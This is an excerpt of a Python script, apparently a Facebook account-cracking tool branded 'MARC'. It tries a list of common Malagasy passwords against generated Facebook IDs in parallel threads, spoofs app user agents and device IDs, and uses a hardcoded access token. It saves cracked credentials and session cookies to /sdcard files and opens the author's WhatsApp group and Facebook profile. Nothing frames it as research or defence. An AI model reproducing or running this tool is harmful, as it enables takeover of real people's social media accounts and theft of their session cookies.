...
os.system('xdg-open https://chat.whatsapp.com/G93FojcJVP3EdUdp3EBRTg')
...
device = {
        ...
        'fbca':fbca,
        'fbdm':fbdm}
os.system('xdg-open https://www.facebook.com/profile.php?id=100033364782050')
...
def pak():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : 26134,26133,26132,26138')
                ...
                with tred(max_workers=30) as TRT:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'malala','tahina','rakoto','fitiavana','malagasy','sitraka','razafy','anjara','sarobidy','vahatra','lahatra','fandresena','nantenaina','nomena','niaina','mandresy','hasina','karemy','ravaka','first1,','last2','last1','last1','malalatiana','felana','valisoa','tatiana','gasikara','madagascar','zazamena','tiako123','tanindrazana','tsiresy','milely123','vadiko','faneva','tiavina','fanomezana','fanomezantsoa','sahaza','avaratra','avotra','tafita','lelena','mamiko','mamako','zanako','jesosy','niaina','finoana','fiderana','nomentsoa','nomena','lanja','haja','hajanirina','nirina','felana','miaritra','tojo','luca','miaja','mily','minosoa','fanorenana','linda','lesabosy','asabosy','neymar','Neymar','Messi','jehova','misotro']
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [MARC-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [MARC-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/MARC-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MARC-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[MARC-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [MARC-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MARC-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/MARC-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/MobileAdsManagerAndroid;FB_IAB/FB4A;FBAV/425.0.0.22.49;FBBV/873387085;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{{density=2.0,width=720,height=1440}};FB_FW/1;]"+"[FBAN/MobileAdsManagerAndroid;FBAV/408.0.0.56.44;FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/{{density=2.0,width=720,height=1440}};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/410.0.0.26.115;FBBV/645124693;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{{density=2.0,width=720,height=1440}};FBFW/1;]"+"[FBAN/FB4A;FBAV/278.0.0.25.54;FBBV/272257514;FBRV/0;FBPN/com.facebook.katana;FBLC/el_]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/MARC-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MARC-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MARC] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [MARC-CP] '+str(uid)+' | '+pas+'\033[1;97m')
